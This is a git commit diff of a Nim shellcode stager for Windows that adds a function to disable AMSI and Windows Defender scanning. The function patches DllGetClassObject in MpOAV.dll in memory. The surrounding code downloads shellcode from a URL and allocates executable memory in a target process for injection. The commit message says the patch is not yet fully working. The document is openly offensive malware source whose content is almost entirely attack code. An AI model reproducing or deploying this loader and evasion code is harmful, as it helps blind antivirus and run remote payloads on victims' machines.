2f03e7993c17ff5dd41e6ec34f39bd367d4eb95d
Jakob Friedl <71284620+jakobfriedl@users.noreply.github.com>
2023-09-04 14:24:26 +0200

    Implemented AMSI patch, not fully working

--- nim/stager/src/pinject_stager.nim
+++ nim/stager/src/pinject_stager.nim
@@ -1,4 +1,7 @@
-import winim, strformat, strutils, httpclient, streams
+import winim
+import os
+import httpclient, streams
+import sequtils, strutils, strformat
 
 # Status indicators
 template success(s: varargs[untyped]): untyped = 
@@ -44,8 +47,43 @@ proc GetPIDByName(process: string) : DWORD =
 
     return pid
 
+when defined amd64:
+    info("Running in x64 process")
+    const patch: array[6, byte] = [byte 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3]
+elif defined i386:
+    info("Running in x86 process")
+    const patch: array[8, byte] = [byte 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00]
+
+proc patchAMSI() : bool = 
+    var
+        amsi: HMODULE
+        cs: pointer
+        op: DWORD
+        t: DWORD
+        disabled: bool = false
+ 
+    let filesInPath = toSeq(walkDir("C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\", relative=true))
+    var length = len(filesInPath)
+
+    amsi = LoadLibrary(fmt"C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\{filesInPath[length-1].path}\\MpOAV.dll")
+    if amsi == 0:
+        fail("Failed to load MpOav.dll")
+        return disabled
+    cs = GetProcAddress(amsi,"DllGetClassObject")
+    if cs == nil:
+        fail("Failed to get the address of 'DllGetClassObject'")
+        return disabled
+
+    if VirtualProtect(cs, patch.len, 0x40, addr op):
+        info("Applying patch")
+        copyMem(cs, unsafeAddr patch, patch.len)
+        VirtualProtect(cs, patch.len, op, addr t)
+        disabled = true
+
+    return disabled
+
 proc run() : int = 
-    
+
     var pHandle: HANDLE
     
     # Get PID of target process
@@ -82,6 +120,13 @@ proc run() : int =
     var shellcode = response.bodyStream.readAll()
     success(fmt"> Read {shellcode.len} bytes from {url}")
 
+    # Patch AMSI
+    info("Patching AMSI")
+    if patchAMSI() == false:
+        fail("Failed to patch AMSI")
+        return ERROR
+    success("> Patched AMSI")
+    
     # VirtualAllocEx: https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex
     info("Allocating memory in process")
     var lpAddress = VirtualAllocEx(pHandle, nil, shellcode.len, MEM_COMMIT or MEM_RESERVE, PAGE_EXECUTE_READWRITE)
